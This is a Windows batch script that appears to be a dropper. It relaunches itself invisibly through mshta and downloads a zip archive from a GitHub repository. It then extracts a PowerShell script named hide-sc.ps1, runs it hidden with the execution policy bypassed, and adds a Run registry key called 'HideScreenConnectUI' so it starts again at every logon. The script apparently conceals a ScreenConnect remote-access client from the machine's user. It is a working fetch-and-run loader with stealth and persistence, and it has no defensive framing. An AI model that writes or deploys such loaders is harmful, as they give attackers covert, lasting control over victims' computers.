@echo off
setlocal EnableExtensions

set "SELF=%~f0"
if /I not "%~1"=="hidden" (
    mshta "javascript:var s=new ActiveXObject('WScript.Shell'); s.Run('cmd /c \"\"\"%SELF%\"\" hidden\"',0,false);close()"
    exit /b 0
)

set "INSTALL_DIR=%USERPROFILE%\AppData\Local\hide"
set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "ZIP_FILE=%USERPROFILE%\AppData\Local\hide-github.zip"
set "INNER_ZIP=%USERPROFILE%\AppData\Local\hidezip-main\hide-sc.zip"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

if not exist "%USERPROFILE%\AppData\Local" mkdir "%USERPROFILE%\AppData\Local"

curl -L -o "%ZIP_FILE%" "%ZIP_URL%"
if errorlevel 1 exit /b 1

"%PS%" -NoProfile -WindowStyle Hidden -Command "$u='%USERPROFILE%\AppData\Local'; $b=Join-Path $u 'hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath $u -Force; if(Test-Path '%INSTALL_DIR%'){Remove-Item '%INSTALL_DIR%' -Recurse -Force}; New-Item -ItemType Directory -Path '%INSTALL_DIR%' -Force | Out-Null; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
if errorlevel 1 exit /b 1

if not exist "%SCRIPT%" exit /b 1

start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f
exit /b 0
